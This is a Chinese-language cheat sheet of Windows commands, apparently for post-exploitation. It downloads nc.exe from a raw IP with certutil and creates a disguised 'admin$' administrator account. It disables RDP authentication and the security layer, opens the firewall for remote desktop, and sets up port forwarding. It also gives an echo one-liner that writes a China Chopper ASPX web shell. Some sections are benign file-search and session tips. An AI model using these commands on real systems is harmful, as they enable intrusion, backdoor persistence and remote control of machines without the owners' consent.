

## 下载文件

certutil -urlcache -split -f http://11.1.63.39/nc.exe
## 渗透后置操作

```bash
net user admin$ tuser321 /add
net localgroup administrators admin$ /add
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\TerminalServer" /v fDenyTSConnections /t REG_DWORD /D 0 /f
echo port number is 
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber

gpupdate /force
# 查看开了哪些端口
netstat -aon
```

## FAQ
###  终端服务器超过最大允许连接数
远程桌面界面，在地址栏上 1.1.58.58:65535 /admin

或cmd `mstsc /admin /v:1.1.58.58:65535` ,  此方式不能操作剪贴版
### 终端操作
```
# 查询
qwinsta 查询连接
query session
query user
# kill
log off <id>
tsdiscon rdp-tcp#946
rwinsta <id>关闭连接
```

## TODO
1.TODO: 终端服务器超过最大允许连接数 修改
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MaxInstanceCount
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MaxInstanceCount /t REG_DWORD /d 10 /f

# https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.TerminalServer::TS_MAX_CON_POLICY
tsadmin 可看连接
```
## 查找文件 
win7以上
```ts
find F:\Downloads #查找目录下所有文件　
find F:\Downloads | findstr Apifox      # 过滤Apifox
```
xp/2003

dir \calendar /s
dir D:\ /s | findstr /i txt >c:\tmp.txt


## 端口转发
win7以上
```bash
netsh interface portproxy add v4tov4 listenport=4546 connectaddress=1.1.58.59 connectport=1521
netsh interface portproxy delete v4tov4 listenport=4546 listenaddress=1.1.58.58
netsh interface portproxy show all
netsh interface portproxy reset
```


## 注册表添加删除程序
x64
HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\

## echo 相关

转义用^

aspx
```
echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["chopper"],"unsafe");%^>  >1
```
